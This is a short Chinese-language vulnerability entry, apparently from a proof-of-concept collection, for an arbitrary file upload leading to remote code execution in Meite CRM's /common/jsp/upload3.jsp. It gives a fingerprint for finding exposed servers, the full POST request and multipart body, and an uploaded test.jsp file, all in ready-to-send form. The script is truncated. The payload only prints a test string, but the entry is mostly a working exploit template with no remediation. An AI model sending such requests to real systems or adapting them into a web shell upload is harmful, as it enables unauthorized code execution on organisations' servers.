# 美特CRMcommonjspupload3.jsp存在文件上传致RCE漏洞

- **系统**：美特　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundaryc4e5992e4…`　`Priority: u=0, i`

**请求体 / payload**
```
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream
<% out.println("hello,test");%>
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="key"
file
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="form"
formdata
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: form-data; name="field"
attach_name_1
------geckoformboundaryc4e5992e491182d9864532ef66356073
Content-Disposition: for…（脚本共 929 字，完整版见原文）
```
- **预期**：200　|　—